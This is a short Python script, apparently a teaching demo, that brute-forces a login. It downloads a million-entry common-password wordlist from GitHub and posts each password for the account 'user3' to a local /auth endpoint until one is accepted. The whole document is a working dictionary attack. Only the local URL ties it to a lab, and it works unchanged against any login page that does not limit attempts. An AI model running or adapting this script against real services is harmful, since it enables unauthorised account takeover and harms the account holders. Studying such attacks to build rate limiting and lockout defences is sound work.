# utf-8
# dictionary demo

import requests

pass_ok = False
f_pass = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt')
for password in f_pass.text.split():
    r = requests.post('http://127.0.0.1:5000/auth', json={'login': 'user3', 'password': password})
    if r.status_code == 200:
        print('OK', password)
        pass_ok = True
        break

if not pass_ok:
    print('not found')
